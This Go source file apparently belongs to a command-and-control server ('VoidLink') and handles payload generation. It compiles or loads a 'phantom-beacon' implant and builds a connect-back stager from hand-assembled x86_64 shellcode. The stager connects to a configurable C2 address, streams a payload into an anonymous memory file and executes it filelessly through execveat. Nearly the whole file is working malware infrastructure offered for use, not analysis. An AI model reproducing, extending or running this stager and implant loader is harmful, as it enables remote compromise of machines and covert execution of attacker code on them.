//go:build operational

package handler

import (
	"encoding/binary"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
)

// projectRoot is resolved relative to the c2server binary location.
// Expects layout: <root>/build/c2server → projectRoot = <root>
var projectRoot = resolveProjectRoot()

func resolveProjectRoot() string {
	if env := os.Getenv("VOIDLINK_PROJECT_ROOT"); env != "" {
		return env
	}
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	// binary is at <root>/build/c2server → go up two levels
	return filepath.Dir(filepath.Dir(exe))
}

// CompilePayload attempts to compile a beacon binary via Zig, falling back to
// a pre-built binary on disk. Returns the compiled payload bytes.
func CompilePayload(kernelRelease string, hiddenPorts []int, hasGCC bool) []byte {
	zigBin, _ := exec.LookPath("zig")

	// Try zig build first
	if zigBin != "" {
		log.Printf("[OPERATIONAL] Attempting zig build for kernel %s", kernelRelease)
		cmd := exec.Command(zigBin, "build", "-Doperational=true", "-Doptimize=ReleaseSafe")
		cmd.Dir = filepath.Join(projectRoot, "core")
		cmd.Stdout = os.Stderr
		cmd.Stderr = os.Stderr

		if err := cmd.Run(); err != nil {
			log.Printf("[OPERATIONAL] zig build failed: %v, falling back to pre-built binary", err)
		} else {
			beaconPath := filepath.Join(projectRoot, "core", "zig-out", "bin", "phantom-beacon")
			if data, err := os.ReadFile(beaconPath); err == nil {
				log.Printf("[OPERATIONAL] Compiled beacon: %d bytes", len(data))
				return data
			}
			log.Printf("[OPERATIONAL] Failed to read compiled beacon, falling back")
		}
	}

	// Fallback: load pre-built binary
	implantPath := filepath.Join(projectRoot, "payloads", "implant.bin")
	if data, err := os.ReadFile(implantPath); err == nil {
		log.Printf("[OPERATIONAL] Loaded pre-built implant: %d bytes", len(data))
		return data
	}

	log.Printf("[OPERATIONAL] WARNING: No payload available, returning error stub")
	return buildErrorELF("no payload binary available — build with: zig build -Doperational=true")
}

// Stage1Bytes returns a real stage1 stager binary. Loads from payloads/stage1.bin
// if available, otherwise generates a minimal x86_64 Linux ELF connect-back stager.
func Stage1Bytes() []byte {
	stage1Path := filepath.Join(projectRoot, "payloads", "stage1.bin")
	if data, err := os.ReadFile(stage1Path); err == nil {
		log.Printf("[OPERATIONAL] Loaded pre-built stage1: %d bytes", len(data))
		return data
	}

	log.Println("[OPERATIONAL] Generating stage1 ELF stager")
	return generateStagerELF()
}

// ImplantBytes returns the real implant/beacon binary from disk.
func ImplantBytes() []byte {
	paths := []string{
		filepath.Join(projectRoot, "build", "phantom-beacon"),
		filepath.Join(projectRoot, "payloads", "implant.bin"),
	}

	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil {
			log.Printf("[OPERATIONAL] Loaded implant from %s: %d bytes", p, len(data))
			return data
		}
	}

	log.Printf("[OPERATIONAL] WARNING: No implant binary found, returning error stub")
	return buildErrorELF("implant binary not found — build with: zig build -Doperational=true")
}

// generateStagerELF creates a minimal x86_64 Linux ELF with connect-back stager shellcode.
// Syscall sequence: socket → connect → memfd_create → read/write loop → lseek → execveat.
// C2 address is read from C2_STAGER_ADDR env var (default 127.0.0.1:8080).
func generateStagerELF() []byte {
	c2Addr := os.Getenv("C2_STAGER_ADDR")
	if c2Addr == "" {
		c2Addr = "127.0.0.1:8080"
	}

	host, portStr, err := net.SplitHostPort(c2Addr)
	if err != nil {
		host = "127.0.0.1"
		portStr = "8080"
	}

	ip := net.ParseIP(host).To4()
	if ip == nil {
		ip = net.IPv4(127, 0, 0, 1).To4()
	}

	port := uint16(8080)
	if p, err := strconv.Atoi(portStr); err == nil && p > 0 && p < 65536 {
		port = uint16(p)
	}

	shellcode := buildStagerShellcode(ip, port)
	return wrapShellcodeInELF(shellcode)
}

// buildStagerShellcode generates x86_64 Linux shellcode for a minimal connect-back stager.
// Sequence: socket(AF_INET, SOCK_STREAM) → connect → memfd_create → read→write loop → lseek → execveat.
// Syscall numbers: socket=41, connect=42, read=0, write=1, lseek=8, memfd_create=319, execveat=322, exit=60.
func buildStagerShellcode(ip net.IP, port uint16) []byte {
	portHi := byte(port >> 8)
	portLo := byte(port & 0xff)

	return []byte{
		// ---- socket(AF_INET=2, SOCK_STREAM=1, 0) ----
		0x48, 0x31, 0xd2, //  xor    rdx, rdx
		0x6a, 0x01, //  push   1
		0x5e,       //  pop    rsi             ; SOCK_STREAM
		0x6a, 0x02, //  push   2
		0x5f,       //  pop    rdi             ; AF_INET
		0x6a, 0x29, //  push   0x29
		0x58,       //  pop    rax             ; __NR_socket
		0x0f, 0x05, //  syscall
		0x49, 0x89, 0xc4, //  mov    r12, rax        ; save sockfd

		// ---- build sockaddr_in on stack ----
		0x48, 0x31, 0xc0, //  xor    rax, rax
		0x50,             //  push   rax             ; 8 bytes zero padding
		0x50,             //  push   rax             ; 8 bytes zero padding
		0xc7, 0x04, 0x24, //  mov    dword [rsp],
		0x02, 0x00, portHi, portLo, //    AF_INET(2) + port (network byte order)
		0xc7, 0x44, 0x24, 0x04, //  mov    dword [rsp+4],
		ip[0], ip[1], ip[2], ip[3], //    IP address bytes

		// ---- connect(sockfd, &addr, 16) ----
		0x4c, 0x89, 0xe7, //  mov    rdi, r12        ; sockfd
		0x48, 0x89, 0xe6, //  mov    rsi, rsp        ; &sockaddr_in
		0x6a, 0x10, //  push   16
		0x5a,       //  pop    rdx             ; addrlen
		0x6a, 0x2a, //  push   0x2a
		0x58,       //  pop    rax             ; __NR_connect
		0x0f, 0x05, //  syscall

		// ---- memfd_create("", MFD_CLOEXEC) ----
		0x48, 0x31, 0xff, //  xor    rdi, rdi
		0x57,             //  push   rdi             ; NUL byte on stack
		0x48, 0x89, 0xe7, //  mov    rdi, rsp        ; ptr to ""
		0x6a, 0x01, //  push   1
		0x5e,                                     //  pop    rsi             ; MFD_CLOEXEC
		0x48, 0xc7, 0xc0, 0x3f, 0x01, 0x00, 0x00, //  mov    rax, 319        ; __NR_memfd_create
		0x0f, 0x05, //  syscall
		0x49, 0x89, 0xc5, //  mov    r13, rax        ; save memfd

		// ---- allocate 4096-byte read buffer ----
		0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00, //  sub    rsp, 4096

		// ---- read_loop: read(sockfd, buf, 4096) ----
		0x4c, 0x89, 0xe7, //  mov    rdi, r12        ; sockfd
		0x48, 0x89, 0xe6, //  mov    rsi, rsp        ; buffer
		0xba, 0x00, 0x10, 0x00, 0x00, //  mov    edx, 4096
		0x48, 0x31, 0xc0, //  xor    rax, rax        ; __NR_read
		0x0f, 0x05, //  syscall
		0x48, 0x85, 0xc0, //  test   rax, rax
		0x7e, 0x10, //  jle    exec            ; +16 bytes forward

		// ---- write(memfd, buf, bytes_read) ----
		0x48, 0x89, 0xc2, //  mov    rdx, rax        ; count
		0x48, 0x89, 0xe6, //  mov    rsi, rsp        ; buffer
		0x4c, 0x89, 0xef, //  mov    rdi, r13        ; memfd
		0x6a, 0x01, //  push   1
		0x58,       //  pop    rax             ; __NR_write
		0x0f, 0x05, //  syscall
		0xeb, 0xdb, //  jmp    read_loop       ; -37 bytes back

		// ---- exec: lseek(memfd, 0, SEEK_SET) ----
		0x4c, 0x89, 0xef, //  mov    rdi, r13        ; memfd
		0x48, 0x31, 0xf6, //  xor    rsi, rsi        ; offset = 0
		0x48, 0x31, 0xd2, //  xor    rdx, rdx        ; SEEK_SET
		0x6a, 0x08, //  push   8
		0x58,       //  pop    rax             ; __NR_lseek
		0x0f, 0x05, //  syscall

		// ---- execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH) ----
		0x4c, 0x89, 0xef, //  mov    rdi, r13        ; fd
		0x48, 0x31, 0xf6, //  xor    rsi, rsi
		0x56,             //  push   rsi             ; NUL on stack
		0x48, 0x89, 0xe6, //  mov    rsi, rsp        ; pathname = ""
		0x48, 0x31, 0xd2, //  xor    rdx, rdx        ; argv = NULL
		0x4d, 0x31, 0xd2, //  xor    r10, r10        ; envp = NULL
		0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, //  mov    r8, 0x1000      ; AT_EMPTY_PATH
		0x48, 0xc7, 0xc0, 0x42, 0x01, 0x00, 0x00, //  mov    rax, 322        ; __NR_execveat
		0x0f, 0x05, //  syscall

		// ---- exit(1) on failure ----
		0x6a, 0x01, //  push   1
		0x5f,       //  pop    rdi
		0x6a, 0x3c, //  push   60
		0x58,       //  pop    rax             ; __NR_exit
		0x0f, 0x05, //  syscall
	}
}

// wrapShellcodeInELF creates a minimal static ELF64 executable wrapping the given shellcode.
func wrapShellcodeInELF(shellcode []byte) []byte {
	const (
		ehdrSize = 64 // ELF64 header size
		phdrSize = 56 // Program header entry size
		baseAddr = 0x400000
	)

	codeOffset := ehdrSize + phdrSize
	entryPoint := uint64(baseAddr) + uint64(codeOffset)
	totalSize := codeOffset + len(shellcode)

	elf := make([]byte, totalSize)

	// ELF header
	copy(elf[0:4], []byte{0x7f, 'E', 'L', 'F'})
	elf[4] = 2                                                  // ELFCLASS64
	elf[5] = 1                                                  // ELFDATA2LSB
	elf[6] = 1                                                  // EV_CURRENT
	elf[7] = 0                                                  // ELFOSABI_NONE
	elf[16] = 2                                                 // e_type: ET_EXEC
	elf[18] = 0x3e                                              // e_machine: EM_X86_64
	binary.LittleEndian.PutUint32(elf[20:24], 1)                // e_version
	binary.LittleEndian.PutUint64(elf[24:32], entryPoint)       // e_entry
	binary.LittleEndian.PutUint64(elf[32:40], uint64(ehdrSize)) // e_phoff
	binary.LittleEndian.PutUint16(elf[52:54], uint16(ehdrSize)) // e_ehsize
	binary.LittleEndian.PutUint16(elf[54:56], uint16(phdrSize)) // e_phentsize
	binary.LittleEndian.PutUint16(elf[56:58], 1)                // e_phnum

	// Program header: PT_LOAD, PF_R|PF_X
	ph := elf[ehdrSize:]
	binary.LittleEndian.PutUint32(ph[0:4], 1)                   // p_type: PT_LOAD
	binary.LittleEndian.PutUint32(ph[4:8], 5)                   // p_flags: PF_R|PF_X
	binary.LittleEndian.PutUint64(ph[16:24], uint64(baseAddr))  // p_vaddr
	binary.LittleEndian.PutUint64(ph[24:32], uint64(baseAddr))  // p_paddr
	binary.LittleEndian.PutUint64(ph[32:40], uint64(totalSize)) // p_filesz
	binary.LittleEndian.PutUint64(ph[40:48], uint64(totalSize)) // p_memsz
	binary.LittleEndian.PutUint64(ph[48:56], 0x1000)            // p_align

	// Shellcode
	copy(elf[codeOffset:], shellcode)

	return elf
}

// buildErrorELF creates a minimal ELF64 binary with an error message embedded.
// The binary writes the error to stderr and exits with code 1.
func buildErrorELF(msg string) []byte {
	msgBytes := []byte(msg)
	msgLen := len(msgBytes)

	// Shellcode: write(2, msg, len) then exit(1)
	// msg is appended right after the shellcode, referenced via rip-relative lea
	sc := []byte{
		// write(STDERR=2, msg, len)
		0x6a, 0x02, //  push   2
		0x5f,                                     //  pop    rdi             ; fd = stderr
		0x48, 0x8d, 0x35, 0x17, 0x00, 0x00, 0x00, //  lea    rsi, [rip+23]  ; msg address
		0xba, //  mov    edx, <len>
		byte(msgLen), byte(msgLen >> 8), byte(msgLen >> 16), byte(msgLen >> 24),
		0x6a, 0x01, //  push   1
		0x58,       //  pop    rax             ; __NR_write
		0x0f, 0x05, //  syscall
		// write newline
		0x48, 0x8d, 0x35, 0x0c, 0x00, 0x00, 0x00, //  lea    rsi, [rip+12]  ; newline after msg
		0xba, 0x01, 0x00, 0x00, 0x00, //  mov    edx, 1
		0x6a, 0x01, //  push   1
		0x58,       //  pop    rax
		0x0f, 0x05, //  syscall
		// exit(1)
		0x6a, 0x01, //  push   1
		0x5f,       //  pop    rdi
		0x6a, 0x3c, //  push   60
		0x58,       //  pop    rax             ; __NR_exit
		0x0f, 0x05, //  syscall
	}

	// Append message + newline after shellcode
	sc = append(sc, msgBytes...)
	sc = append(sc, '\n')

	return wrapShellcodeInELF(sc)
}
